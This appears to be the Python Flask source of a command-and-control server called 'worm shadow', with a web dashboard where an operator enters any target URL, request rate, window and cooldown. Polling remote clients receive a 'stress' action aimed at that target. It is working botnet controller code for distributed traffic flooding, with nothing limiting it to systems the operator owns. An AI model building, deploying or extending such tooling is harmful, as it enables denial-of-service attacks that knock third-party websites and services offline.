import os
import threading
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

STALE_AFTER = 15.0   # generous: render cold starts + network jitter

lock = threading.Lock()
clients = {}
job = {
    "target": None,
    "threads": 0,
    "active": False,
    "rate": 10,
    "window": 3.0,
    "cooldown": 10.0,
    "started_at": None,
}
log_lines = []


def log(msg):
    line = f"[{datetime.utcnow().isoformat(timespec='seconds')}] {msg}"
    with lock:
        log_lines.append(line)
        if len(log_lines) > 300:
            log_lines.pop(0)
    print(line, flush=True)


def prune_clients_locked():
    now = time.time()
    dead = [cid for cid, t in clients.items() if now - t > STALE_AFTER]
    for cid in dead:
        del clients[cid]
    return dead


DASH = """
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>worm shadow // control</title>
<style>
  body { background:#0d0d0f; color:#d6d6d6; font-family:ui-monospace,Consolas,monospace; margin:0; padding:24px; }
  h1 { font-weight:400; color:#8be9fd; letter-spacing:2px; margin:0 0 4px; }
  .sub { color:#555; margin-bottom:24px; font-size:12px; }
  .grid { display:grid; grid-template-columns: 360px 1fr; gap:24px; }
  .card { border:1px solid #222; background:#111; padding:16px; border-radius:6px; }
  label { display:block; color:#777; font-size:12px; margin:12px 0 4px; }
  input { width:100%; box-sizing:border-box; background:#0a0a0c; border:1px solid #2a2a2e;
          color:#e0e0e0; padding:8px; border-radius:4px; font-family:inherit; }
  button { margin-top:16px; width:100%; padding:10px; background:#1c1c22; color:#8be9fd;
           border:1px solid #333; border-radius:4px; cursor:pointer; letter-spacing:1px; }
  button:hover { background:#242430; }
  button.stop { color:#ff5f5f; }
  table { width:100%; border-collapse:collapse; font-size:13px; }
  td,th { text-align:left; padding:6px 8px; border-bottom:1px solid #1a1a1e; }
  th { color:#555; font-weight:400; }
  .on { color:#50fa7b; } .off { color:#ff5555; }
  .big { font-size:28px; color:#50fa7b; }
  pre { background:#0a0a0c; border:1px solid #1a1a1e; padding:12px; height:220px;
        overflow:auto; font-size:12px; color:#9a9a9a; border-radius:4px; }
</style>
</head>
<body>
  <h1>worm shadow 🪱 // control</h1>
  <div class="sub">main flask — command + status</div>

  <div class="grid">
    <div class="card">
      <label>target url</label>
      <input id="target" placeholder="https://example.com">
      <label>clients to use</label>
      <input id="threads" type="number" value="1" min="1">
      <label>rate (requests)</label>
      <input id="rate" type="number" value="10" min="1">
      <label>window (seconds)</label>
      <input id="window" type="number" value="3" step="0.5">
      <label>cooldown (seconds)</label>
      <input id="cooldown" type="number" value="10" step="0.5">
      <button onclick="startJob()">START</button>
      <button class="stop" onclick="stopJob()">STOP</button>
    </div>

    <div class="card">
      <table>
        <tr><th>state</th><td id="state">idle</td></tr>
        <tr><th>target</th><td id="jtarget">—</td></tr>
        <tr><th>connected</th><td><span class="big" id="nclients">0</span></td></tr>
      </table>
      <div style="margin-top:12px;color:#555;font-size:12px">live clients</div>
      <div id="clist" style="font-size:13px;color:#9a9a9a;margin-top:4px">—</div>
      <pre id="logbox" style="margin-top:16px"></pre>
    </div>
  </div>

<script>
async function startJob(){
  const body = {
    target: document.getElementById('target').value,
    threads: +document.getElementById('threads').value,
    rate: +document.getElementById('rate').value,
    window: +document.getElementById('window').value,
    cooldown: +document.getElementById('cooldown').value,
  };
  await fetch('/api/start', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)});
  refresh();
}
async function stopJob(){ await fetch('/api/stop', {method:'POST'}); refresh(); }

async function refresh(){
  try {
    const r = await fetch('/api/status');
    const d = await r.json();
    document.getElementById('state').textContent = d.active ? 'RUNNING' : 'idle';
    document.getElementById('state').className = d.active ? 'on' : 'off';
    document.getElementById('jtarget').textContent = d.target || '—';
    document.getElementById('nclients').textContent = d.clients.length;
    document.getElementById('clist').textContent = d.clients.map(c => c.id + ' (' + c.age + 's)').join('  |  ') || 'none';
    document.getElementById('logbox').textContent = d.log.join('\\n');
  } catch(e) {}
}
setInterval(refresh, 1500); refresh();
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return render_template_string(DASH)


@app.route("/health")
def health():
    return jsonify(ok=True, ts=time.time())


@app.route("/api/start", methods=["POST"])
def api_start():
    data = request.get_json(force=True)
    with lock:
        job["target"] = data.get("target", "").strip()
        job["threads"] = int(data.get("threads", 1))
        job["rate"] = int(data.get("rate", 10))
        job["window"] = float(data.get("window", 3.0))
        job["cooldown"] = float(data.get("cooldown", 10.0))
        job["active"] = bool(job["target"])
        job["started_at"] = time.time() if job["active"] else None
    if job["active"]:
        log(f"JOB START -> {job['target']} rate={job['rate']}/{job['window']}s cd={job['cooldown']}s")
    else:
        log("JOB START rejected: empty target")
    return jsonify(ok=True)


@app.route("/api/stop", methods=["POST"])
def api_stop():
    with lock:
        job["active"] = False
        job["target"] = None
    log("JOB STOP")
    return jsonify(ok=True)


@app.route("/api/status")
def api_status():
    now = time.time()
    with lock:
        dead = prune_clients_locked()
        for cid in dead:
            log(f"client dropped (stale): {cid}")
        clist = [{"id": cid, "age": int(now - t)} for cid, t in clients.items()]
        return jsonify(
            active=job["active"],
            target=job["target"],
            rate=job["rate"],
            window=job["window"],
            cooldown=job["cooldown"],
            threads=job["threads"],
            clients=clist,
            log=log_lines[-80:],
        )


@app.route("/api/register", methods=["POST"])
def api_register():
    data = request.get_json(force=True)
    cid = data.get("id", "unknown")
    with lock:
        if cid not in clients:
            log(f"client registered: {cid}")
        clients[cid] = time.time()
    return jsonify(ok=True)


@app.route("/api/poll", methods=["POST"])
def api_poll():
    data = request.get_json(force=True)
    cid = data.get("id", "unknown")
    with lock:
        prune_clients_locked()
        if cid not in clients:
            log(f"client registered (via poll): {cid}")
        clients[cid] = time.time()
        if job["active"] and job["target"]:
            return jsonify(
                action="stress",
                target=job["target"],
                rate=job["rate"],
                window=job["window"],
                cooldown=job["cooldown"],
            )
    return jsonify(action="idle")


@app.route("/api/report", methods=["POST"])
def api_report():
    data = request.get_json(force=True)
    cid = data.get("id", "?")
    msg = data.get("msg", "")
    with lock:
        prune_clients_locked()
        if cid in clients:
            clients[cid] = time.time()
    log(f"report [{cid}] {msg}")
    return jsonify(ok=True)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
